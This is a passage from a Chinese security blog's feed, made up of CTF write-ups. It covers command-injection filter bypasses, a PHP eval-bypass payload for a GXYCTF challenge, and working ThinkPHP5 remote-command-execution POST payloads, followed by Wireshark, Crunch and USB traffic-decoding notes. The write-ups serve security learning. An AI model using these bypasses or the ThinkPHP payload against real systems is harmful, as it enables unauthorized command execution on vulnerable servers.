        <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 时间的朋友 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行漏洞</title>
      <link href="/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/12/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h4><p>cmd与bash的一些规则</p><div class="table-container"><table><thead><tr><th></th><th>Windows</th><th>Linux</th></tr></thead><tbody><tr><td>转义字符</td><td>^</td><td>\</td></tr><tr><td>多条命令执行</td><td>&amp;&amp;、%0a</td><td>&amp;&amp;、；、$()、``、%0a、%0d</td></tr><tr><td>注释符号</td><td>：：</td><td>#</td></tr></tbody></table></div><p>除此之外，再Windows和Linux环境下还可以通过||来进行多条命令的执行，但是&amp;&amp;与||存在惰性原则，and一个不成立就不执行第二个，or若第一个成立也不执行第二个</p><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h5><p>有时题目对过滤掉空格，于是我们可以采用以下方法来构造</p><ol><li>用<code>%00-%ff</code>区间的字符串测试，如<code>%09</code></li><li>在windows下通过<code>%ProgramFiles:~10,1%</code>获取空格<br><code>~</code>为截取符<code>%ProgramFile%</code>一般为<code>C:Program Files</code>截取从第十个字符开始的一个字符，即为空格</li><li>Linux下<ul><li><code>$IFS$9</code></li><li><code>&#123;cmd,args&#125;</code>  对<code>bash</code>有效，对<code>zsh、dash</code>无效</li><li><code>cat&lt;&gt;flag</code>  读取文件时</li><li>e.g.<code>echo$IF$9aaaa</code>    <code>&#123;echo,aaaa&#125;</code></li></ul></li></ol><h5 id="黑名单关键字"><a href="#黑名单关键字" class="headerlink" title="黑名单关键字"></a>黑名单关键字</h5><p>有时题目对过滤掉<code>cat flag</code>等关键字，于是我们可以采用以下方法来构造</p><ol><li><p><strong>变量拼接</strong>  <code>Linux:a=c;b=at;c=he;d=llo;$a$b $&#123;c&#125;$&#123;d&#125;</code><br>给变量重新赋值 拼接后为<code>cat flag</code></p></li><li><p><strong>使用通配符</strong>  <code>Linux:cat /tm?/fl*</code>    <code>Windows:type fla*</code><br>?代表任意一个字符串，*则代表任意个字符创</p></li><li><p><strong>借用已有字符串</strong> 如果禁用<code>&lt;&gt;?</code>等字符串，则可以借用其他文件中的字符串，利用<code>substr()</code>函数来截取某个特定字符串。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:cat test.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="built_in">echo</span> test.php;</span><br><span class="line">?&gt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==1 test.php) 1 1`</span><br><span class="line">&lt;</span><br><span class="line">root@kali:<span class="built_in">echo</span> `expr substr $(awk NR==3 test.php) 2 1`</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ol><h5 id="执行无回显"><a href="#执行无回显" class="headerlink" title="执行无回显"></a>执行无回显</h5><ol><li>HTTP通道</li><li>DNS通道</li><li>时间盲注</li><li>写入文件，二次返回</li></ol><h4 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h4><h5 id="GitHack"><a href="#GitHack" class="headerlink" title="GitHack"></a><a href="https://github.com/lijiejie/GitHack">GitHack</a></h5><p>存在git泄露 扫码网站得到index.php</p><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先传入参数<code>exp</code>，第一个和第三个if过滤掉了协议以及关键词</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;]))</span><br></pre></td></tr></table></figure><p>第二个if表明所给的<code>exp</code>在去掉字母括号后为<code>;</code></p><h5 id="构造"><a href="#构造" class="headerlink" title="构造."></a>构造<code>.</code></h5><p>源码在<code>flag.php</code>中</p><p>我们可以通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>来扫码当前目录下的文件，但是<code>.</code>符号已经被过滤</p><p>于是我们可以构造<code>.</code>号，有以下两种方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>从而获取到了5个文件，<code>flag.php</code>为数组的倒数第二个元素</p><h5 id="获取falg-php"><a href="#获取falg-php" class="headerlink" title="获取falg.php"></a>获取falg.php</h5><p>为了获取倒数第二个元素，我们可以通过<code>array_rand(array_filp())</code>随机从数组中取值。其中<code>array_flip()</code>交换数组的键和值，<code>array_rand()</code>从数组中随机取出一个或多个单元。</p><p>构造<code>payload</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>由于是随机取值，多刷新几遍网页就可以得到flag</p><h4 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h4><p>发现网页由THINKPHP5驱动，发现其存在<a href="https://xz.aliyun.com/t/3845">漏洞</a>,即可通过Post操作传入下列参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;</span><br></pre></td></tr></table></figure><p>这是应对漏洞的一种格式固定的操作。有以上两种方法。等号后面跟的是命令。</p><p>先传参查看目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><p>后获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>流量分析</title>
      <link href="/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2020/11/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h4 id="Wireshark常用过滤指令"><a href="#Wireshark常用过滤指令" class="headerlink" title="Wireshark常用过滤指令"></a>Wireshark常用过滤指令</h4><p>过滤IP：<code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x</code></p><p>•过滤端口：<code>tcp.port eq 80 or udp.port eq 80</code></p><p>•过滤协议：<code>tcp/udp/http/tls/ssl/icmp/ftp/dns/ip</code></p><p>•http过滤模式：</p><p>​     •<code>http.request.method == “GET”</code></p><p>​     •<code>http.request.method == “POST”</code></p><p>​     •<code>http.request.uri == “[路由地址]”</code></p><p>​     •<code>[协议] contains “[关键字]”</code></p><h4 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h4><p>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage: crunch [options]</span><br><span class="line"></span><br><span class="line">crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</span><br><span class="line"></span><br><span class="line"> min-len  设定最小字符串长度</span><br><span class="line"> max-len  设定最大字符串长度</span><br><span class="line"> </span><br><span class="line"> options</span><br><span class="line"> -o password.txt 指定输出文件的名称，例如password.txt</span><br><span class="line"></span><br><span class="line">-t 命令</span><br><span class="line"></span><br><span class="line">-t @,%^ 指定模式，</span><br><span class="line"></span><br><span class="line">@ 插入小写字母</span><br><span class="line">, 插入大写字母</span><br><span class="line">% 插入数字</span><br><span class="line">^ 插入特殊符号</span><br></pre></td></tr></table></figure><p>Crunch命令详解 以及使用方法</p><p><a href="https://blog.csdn.net/qq_42025840/article/details/81125584">https://blog.csdn.net/qq_42025840/article/details/81125584</a></p><h4 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h4><p>在kali下提取得到 <code>usbdata.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark   -r usb2.pcap  -T fields -e usb.capdata  &gt;  usbdata.txt</span><br></pre></td></tr></table></figure><p>然后将16进制的<code>usbdata.txt</code>转化为坐标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  usb.py  &gt;  xy.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#usb.py</span></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> len(line) != <span class="number">12</span> :</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    x = int(line[<span class="number">3</span>:<span class="number">5</span>],<span class="number">16</span>)</span><br><span class="line">    y = int(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) </span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :                     <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        <span class="keyword">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><p>进入gnuplot工具，将xy.txt中的坐标转图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gnuplot                   &#x2F;&#x2F;进入gunplot工具</span><br><span class="line">plot  &quot;xy.txt&quot;            &#x2F;&#x2F;把xy.txt文本里的坐标转化为图片</span><br></pre></td></tr></table></figure><h4 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>在kali下提取得到<code>usbdata.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>对生成<code>flag.txt</code>去空行后执行下面脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span 